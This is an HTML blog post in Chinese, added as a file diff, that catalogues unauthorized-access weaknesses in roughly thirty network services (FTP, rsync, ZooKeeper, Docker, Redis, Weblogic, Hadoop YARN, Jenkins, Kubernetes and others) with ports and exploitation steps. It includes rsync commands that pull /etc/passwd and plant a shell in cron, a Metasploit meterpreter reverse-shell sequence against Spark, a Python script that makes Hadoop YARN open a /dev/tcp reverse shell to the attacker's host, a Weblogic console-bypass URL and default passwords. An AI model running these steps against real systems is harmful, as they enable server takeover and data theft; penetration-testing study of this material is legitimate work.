@@ -1,0 +1,409 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Sky&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Sky&#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Sky&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="未授权漏洞利用"><meta property="og:type" content="blog"><meta property="og:title" content="Sky&#039;s Blog"><meta property="og:url" content="http://example.com/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"><meta property="og:site_name" content="Sky&#039;s Blog"><meta property="og:description" content="未授权漏洞利用"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2025-12-18T14:15:40.857Z"><meta property="article:modified_time" content="2025-12-18T14:16:13.404Z"><meta property="article:author" content="Sky"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"},"headline":"Sky's Blog","image":["http://example.com/img/og_image.png"],"datePublished":"2025-12-18T14:15:40.857Z","dateModified":"2025-12-18T14:16:13.404Z","author":{"@type":"Person","name":"Sky"},"publisher":{"@type":"Organization","name":"Sky's Blog","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"未授权漏洞利用"}</script><link rel="canonical" href="http://example.com/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><script data-ad-client="test" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" referrerpolicy="no-referrer" alt="Sky&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/flypigc/"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-12-18T14:15:40.857Z" title="2025/12/18 22:15:40">2025-12-18</time>发表</span><span class="level-item"><time dateTime="2025-12-18T14:16:13.404Z" title="2025/12/18 22:16:13">2025-12-18</time>更新</span><span class="level-item">25 分钟读完 (大约3712个字)</span></div></div><div class="content"><h1 id="未授权漏洞利用"><a href="#未授权漏洞利用" class="headerlink" title="未授权漏洞利用"></a>未授权漏洞利用</h1><span id="more"></span>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>未作限制，普通用户能垂直越权什么的</p>
+<p>未授权访问，在不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p>
+<h2 id="FTP-未授权访问"><a href="#FTP-未授权访问" class="headerlink" title="FTP 未授权访问"></a>FTP 未授权访问</h2><ul>
+<li><p>端口：21</p>
+</li>
+<li><p>介绍：FTP服务端配置anymouns 可登录，则可直接使用user为anymouns，不输入密码直接可登录到FTP</p>
+</li>
+<li><p>漏洞利用：直接访问ftp路径：<a href="ftp://ip:port/，或终端登录，输入user为anymouns">ftp://ip:port/，或终端登录，输入user为anymouns</a></p>
+</li>
+</ul>
+<h2 id="LDAP-未授权访问"><a href="#LDAP-未授权访问" class="headerlink" title="LDAP 未授权访问"></a>LDAP 未授权访问</h2><ul>
+<li><p>端口：389</p>
+</li>
+<li><p>介绍：LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问，<strong>存储和查询 “目录型数据” 的网络协议</strong></p>
+</li>
+<li><p>漏洞利用：<a target="_blank" rel="noopener" href="https://ldapbrowserwindows.com/">工具</a>连接</p>
+</li>
+</ul>
+<h2 id="rsync-未授权访问"><a href="#rsync-未授权访问" class="headerlink" title="rsync 未授权访问"></a>rsync 未授权访问</h2><ul>
+<li><p>端口：873</p>
+</li>
+<li><p>介绍：rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件</p>
+</li>
+<li><p>漏洞利用：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/rsync/common/">https://vulhub.org/#/environments/rsync/common/</a></p>
+</li>
+<li><p><code>rsync rsync://your-ip:873/src/</code> 列出目录</p>
+</li>
+<li><p><code>rsync -av rsync://your-ip:873/src/etc/passwd ./</code> 下载文件</p>
+</li>
+<li><p><code>rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell</code> 上传文件</p>
+</li>
+</ul>
+<h2 id="ZooKeeper-未授权访问"><a href="#ZooKeeper-未授权访问" class="headerlink" title="ZooKeeper 未授权访问"></a>ZooKeeper 未授权访问</h2><ul>
+<li><p>端口：2181</p>
+</li>
+<li><p>介绍：ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p><code>echo envi| nc xxx.xxx.xxx.xxx 2181</code> 获取服务器环境信息</p>
+</li>
+<li><p><code>echo stat | nc 192.168.131.128 2181</code></p>
+</li>
+</ul>
+<h2 id="Docker-未授权访问"><a href="#Docker-未授权访问" class="headerlink" title="Docker 未授权访问"></a>Docker 未授权访问</h2><ul>
+<li><p>端口：2375</p>
+</li>
+<li><p>介绍：Docker API可以执行Docker命令，在未授权的情况下可以执行docker命令</p>
+</li>
+<li><p>漏洞利用：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/docker/unauthorized-rce/">https://vulhub.org/#/environments/docker/unauthorized-rce/</a></p>
+</li>
+</ul>
+<h2 id="Docker-Registry-未授权访问"><a href="#Docker-Registry-未授权访问" class="headerlink" title="Docker Registry 未授权访问"></a>Docker Registry 未授权访问</h2><ul>
+<li><p>端口：5000</p>
+</li>
+<li><p>介绍：docker remote api可以执行docker命令</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p><code>curl -k -XGET https://xxx.xxx.xxxx/v2/_catalog</code> 查询catalog</p>
+</li>
+<li><p><code>curl -k -XGET https://xxx.xxx.xxx/v2/&lt;image&gt;/tags/list</code>查询tags</p>
+</li>
+</ul>
+<h2 id="Kibana-未授权访问"><a href="#Kibana-未授权访问" class="headerlink" title="Kibana 未授权访问"></a>Kibana 未授权访问</h2><ul>
+<li><p>端口: 5001</p>
+</li>
+<li><p>介绍：Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成数据泄露。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>直接访问kibana的页面</p>
+</li>
+</ul>
+<h2 id="VNC未授权访问"><a href="#VNC未授权访问" class="headerlink" title="VNC未授权访问"></a>VNC未授权访问</h2><ul>
+<li><p>端口：5900, 5901</p>
+</li>
+<li><p>介绍：VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重</p>
+</li>
+<li><p>漏洞利用：下载<a target="_blank" rel="noopener" href="https://www.realvnc.com/en/connect/download/viewer/">VNC® Viewer</a>，并连接，这个要结合其他漏洞利用，不然还是挺难利用的</p>
+</li>
+</ul>
+<h2 id="CouchDB-未授权访问"><a href="#CouchDB-未授权访问" class="headerlink" title="CouchDB 未授权访问"></a>CouchDB 未授权访问</h2><ul>
+<li><p>端口：5984</p>
+</li>
+<li><p>介绍：Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>
+</li>
+<li><p>漏洞利用：<code>curl xxx.xxx.xxx.xxx:5984/_config</code></p>
+</li>
+</ul>
+<h2 id="Apache-Spark-未授权访问"><a href="#Apache-Spark-未授权访问" class="headerlink" title="Apache Spark 未授权访问"></a>Apache Spark 未授权访问</h2><ul>
+<li><p>端口：6066, 8081,8082</p>
+</li>
+<li><p>介绍：Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p>
+</li>
+<li><p>漏洞利用：使用msf工具getshell</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;use exploit/linux/http/spark_unauth_rce</span><br><span class="line">msf5&gt;set payload java/meterpreter/reverse_tcp</span><br><span class="line">msf5&gt;set rhost xxx.xxxx.xxxx</span><br><span class="line">msf5&gt;set rport 6066</span><br><span class="line">msf5&gt;set lhost xxx.xxx.xxx.xxx</span><br><span class="line">msf5&gt;set lport 4444</span><br><span class="line">msf5&gt;set srvhost xxx.xxx.xxx.xxx</span><br><span class="line">msf5&gt;set srvport 8080</span><br><span class="line">msf5&gt;exploit</span><br></pre></td></tr></table></figure>
+
+<h2 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h2><ul>
+<li><p>端口：6379</p>
+</li>
+<li><p>介绍：redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。  Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令</p>
+</li>
+<li><p>漏洞利用：redis-cli远程连接</p>
+</li>
+</ul>
+<h2 id="Weblogic-未授权访问"><a href="#Weblogic-未授权访问" class="headerlink" title="Weblogic 未授权访问"></a>Weblogic 未授权访问</h2><ul>
+<li><p>端口：7001</p>
+</li>
+<li><p>介绍：Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。<br>  CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p><code>http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252fconsole.portal</code>进入后台</p>
+</li>
+</ul>
+<h2 id="Hadoop-YARN-未授权访问"><a href="#Hadoop-YARN-未授权访问" class="headerlink" title="Hadoop YARN 未授权访问"></a>Hadoop YARN 未授权访问</h2><ul>
+<li><p>端口：8088</p>
+</li>
+<li><p>介绍：Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。</p>
+</li>
+<li><p>漏洞利用</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import requests</span><br><span class="line">target = &#x27;http://xxx.xxx.xxx.xxx:8088/&#x27; # 设置目标主机的ip地址</span><br><span class="line">lhost = &#x27;xxx.xxx.xxx.xxx&#x27; # 设置你攻击主机的监听ip地址，并且监听端口为9999</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="JBoss-未授权访问"><a href="#JBoss-未授权访问" class="headerlink" title="JBoss 未授权访问"></a>JBoss 未授权访问</h2><ul>
+<li><p>端口：8080</p>
+</li>
+<li><p>介绍：JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 <a target="_blank" rel="noopener" href="http://ip:8080/jmx-console%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%B5%8F%E8%A7%88">http://ip:8080/jmx-console，就可以浏览</a> Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>同tomcat manager</p>
+</li>
+</ul>
+<h2 id="Jenkins-未授权访问"><a href="#Jenkins-未授权访问" class="headerlink" title="Jenkins 未授权访问"></a>Jenkins 未授权访问</h2><ul>
+<li><p>端口：8080</p>
+</li>
+<li><p>介绍：默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
+</li>
+<li><p>漏洞利用：未授权访问 <code>http://&lt;target&gt;:8080/script</code>，可以执行系统命令</p>
+</li>
+</ul>
+<h2 id="Kubernetes-Api-Server-未授权"><a href="#Kubernetes-Api-Server-未授权" class="headerlink" title="Kubernetes Api Server 未授权"></a>Kubernetes Api Server 未授权</h2><ul>
+<li><p>端口：8080,10250</p>
+</li>
+<li><p>介绍：Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p><code>http://xxx.xxx.xxx.xxx:8080/</code> 可以看到路由信息</p>
+</li>
+<li><p>10250端口是kubelet API的HTTPS端口，通过路径:<code>https://xxx.xxx.xxx.xxx/10250/pods</code>获取环境变量、运行的容器信息、命名空间等信息</p>
+</li>
+</ul>
+<h2 id="Active-MQ-未授权访问"><a href="#Active-MQ-未授权访问" class="headerlink" title="Active MQ 未授权访问"></a>Active MQ 未授权访问</h2><ul>
+<li><p>端口：8161</p>
+</li>
+<li><p>介绍：ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>默认口令：admin&#x2F;admin</p>
+</li>
+</ul>
+<h2 id="Jupyter-Notebook-未授权访问"><a href="#Jupyter-Notebook-未授权访问" class="headerlink" title="Jupyter Notebook 未授权访问"></a>Jupyter Notebook 未授权访问</h2><ul>
+<li><p>端口：8888</p>
+</li>
+<li><p>介绍：Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>访问<code>http://xxx.xxx.xxx.xxx:8888</code>，将看到Jupyter Notebook的Web管理界面，并没有要求填写密码</p>
+</li>
+<li><p>选择 new -&gt; terminal 即可创建一个控制台</p>
+</li>
+<li><p>直接执行任意命令</p>
+</li>
+</ul>
+<h2 id="Elasticsearch-未授权访问"><a href="#Elasticsearch-未授权访问" class="headerlink" title="Elasticsearch 未授权访问"></a>Elasticsearch 未授权访问</h2><ul>
+<li><p>端口：9200,9300</p>
+</li>
+<li><p>介绍：Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>直接访问<code>http://xxx.xxx.xxx.xxx:9200</code></p>
+</li>
+<li><p><code>_cat/indices</code></p>
+</li>
+<li><p><code>_river/_search</code> 数据库信息</p>
+</li>
+<li><p><code>_nodes</code> 节点信息</p>
+</li>
+<li><p><code>_plugin/head</code> （有head插件的情况下）</p>
+</li>
+</ul>
+<h2 id="Zabbix-未授权访问"><a href="#Zabbix-未授权访问" class="headerlink" title="Zabbix 未授权访问"></a>Zabbix 未授权访问</h2><ul>
+<li><p>端口：10051</p>
+</li>
+<li><p>介绍：zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p>
+</li>
+<li><p>漏洞利用</p>
+</li>
+<li><p>无需账户密码直接访问zabbix页面</p>
+</li>
+</ul>
+<h2 id="RabbitMQ-未授权访问"><a href="#RabbitMQ-未授权访问" class="headerlink" title="RabbitMQ 未授权访问"></a>RabbitMQ 未授权访问</h2><ul>
+<li><p>端口：15672,15692,25672</p>
+</li>
+<li><p>介绍：RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>默认账号密码都是guest</p>
+</li>
+</ul>
+<h2 id="MongoDB-未授权访问"><a href="#MongoDB-未授权访问" class="headerlink" title="MongoDB 未授权访问"></a>MongoDB 未授权访问</h2><ul>
+<li><p>端口：27017</p>
+</li>
+<li><p>介绍：开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>使用数据库连接工具 如navicat 等直接连接</p>
+</li>
+</ul>
+<h2 id="NFS-未授权访问"><a href="#NFS-未授权访问" class="headerlink" title="NFS 未授权访问"></a>NFS 未授权访问</h2><ul>
+<li><p>端口：2049，20048</p>
+</li>
+<li><p>介绍：NetworkFileSystem(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>安装nfs客户端 <code>nfs-common</code></p>
+</li>
+<li><p>查看nfs服务器上的共享目录 <code>showmount -e xxx.xxx.xxx.xxx</code></p>
+</li>
+<li><p>挂载相应共享目录到本地 <code>mount -t nfs xxx.xxx.xxx.xxx:/grdata /mnt</code></p>
+</li>
+</ul>
+<h2 id="Dubbo-未授权访问"><a href="#Dubbo-未授权访问" class="headerlink" title="Dubbo 未授权访问"></a>Dubbo 未授权访问</h2><ul>
+<li><p>端口：28096</p>
+</li>
+<li><p>介绍：Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞</p>
+</li>
+<li><p>漏洞利用：<code>telnet ip port</code></p>
+</li>
+</ul>
+<h2 id="Druid-未授权访问"><a href="#Druid-未授权访问" class="headerlink" title="Druid 未授权访问"></a>Druid 未授权访问</h2><ul>
+<li><p>端口：&#x2F;</p>
+</li>
+<li><p>介绍：Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>&#x2F;druid&#x2F;index.html</p>
+</li>
+<li><p>&#x2F;druid&#x2F;websession.html</p>
+</li>
+<li><p>&#x2F;druid&#x2F;datasource.html</p>
+</li>
+<li><p>&#x2F;druid&#x2F;sql.html</p>
+</li>
+<li><p>&#x2F;druid&#x2F;spring.html</p>
+</li>
+</ul>
+<h2 id="Solr-未授权访问"><a href="#Solr-未授权访问" class="headerlink" title="Solr 未授权访问"></a>Solr 未授权访问</h2><ul>
+<li><p>端口：443,8443</p>
+</li>
+<li><p>介绍：Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell</p>
+</li>
+<li><p>漏洞利用</p>
+</li>
+<li><p>&#x2F;solr&#x2F;admin</p>
+</li>
+</ul>
+<h2 id="SpringBoot-Actuator-未授权访问"><a href="#SpringBoot-Actuator-未授权访问" class="headerlink" title="SpringBoot Actuator 未授权访问"></a>SpringBoot Actuator 未授权访问</h2><ul>
+<li><p>端口：&#x2F;</p>
+</li>
+<li><p>介绍：Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>&#x2F;actuator&#x2F;autoconfig</p>
+</li>
+<li><p>&#x2F;actuator&#x2F;env</p>
+</li>
+<li><p>&#x2F;actuator&#x2F;dump</p>
+</li>
+<li><p>&#x2F;actuator&#x2F;headdump 可下载</p>
+</li>
+</ul>
+<h2 id="SwaggerUI未授权访问漏洞"><a href="#SwaggerUI未授权访问漏洞" class="headerlink" title="SwaggerUI未授权访问漏洞"></a>SwaggerUI未授权访问漏洞</h2><ul>
+<li><p>端口：&#x2F;</p>
+</li>
+<li><p>介绍：Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>swagger-ui未直接部在IP根目录下</p>
+</li>
+<li><p>直接访问</p>
+</li>
+</ul>
+<h2 id="Harbor未授权添加管理员漏洞"><a href="#Harbor未授权添加管理员漏洞" class="headerlink" title="Harbor未授权添加管理员漏洞"></a>Harbor未授权添加管理员漏洞</h2><ul>
+<li><p>端口：&#x2F;</p>
+</li>
+<li><p>介绍：Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库</p>
+</li>
+<li><p>漏洞利用：</p>
+</li>
+<li><p>&#x2F;harbor&#x2F;sign-in</p>
+</li>
+<li><p>注册管理员</p>
+</li>
+<li><p>像我们实验室的内部系统就是用的这个仓库，功能就是把docker打包的镜像传上去</p>
+</li>
+</ul>
+</div><div class="article-licensing box"><div class="licensing-title"><p><a href="http://example.com/2025/12/18/未授权服务利用/">http://example.com/2025/12/18/未授权服务利用/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Sky</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-12-18</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2025-12-18</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=6938dd3470fd5d0337653de1&amp;product=sop" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" referrerpolicy="no-referrer" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><a class="button donate" data-type="paypal" onclick="document.getElementById(&#039;paypal-donate-form&#039;).submit()"><span class="icon is-small"><i class="fab fa-paypal"></i></span><span>Paypal</span></a><form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank" rel="noopener" id="paypal-donate-form"><input type="hidden" name="cmd" value="_donations"><input type="hidden" name="business" value="1"><input type="hidden" name="currency_code" value="USD"></form><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img 